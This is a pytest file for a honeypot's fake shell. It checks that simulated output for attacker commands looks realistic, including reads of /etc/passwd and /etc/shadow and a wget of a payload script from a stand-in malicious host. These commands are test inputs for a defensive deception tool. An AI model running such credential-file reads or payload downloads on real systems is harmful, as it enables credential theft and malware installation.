"""Tests for the fake shell command responses."""

from honeypot.services.fake_shell import FakeShell


def test_uname_a():
    shell = FakeShell()
    out = shell.execute("uname -a")
    assert "Linux" in out
    assert "x86_64" in out


def test_id():
    shell = FakeShell()
    out = shell.execute("id")
    assert "uid=0(root)" in out


def test_cat_passwd():
    shell = FakeShell()
    out = shell.execute("cat /etc/passwd")
    assert "root:" in out
    assert "/bin/bash" in out


def test_cat_shadow():
    shell = FakeShell()
    out = shell.execute("cat /etc/shadow")
    assert "root:" in out


def test_unknown_command():
    shell = FakeShell()
    out = shell.execute("malware_dropper")
    assert "command not found" in out


def test_cd_changes_prompt():
    shell = FakeShell()
    shell.execute("cd /tmp")
    assert "/tmp" in shell.prompt()


def test_wget_fails_convincingly():
    shell = FakeShell()
    out = shell.execute("wget http://malicious.example.com/payload.sh")
    assert "Connection refused" in out or "failed" in out.lower()


def test_echo():
    shell = FakeShell()
    out = shell.execute("echo hello world")
    assert "hello world" in out
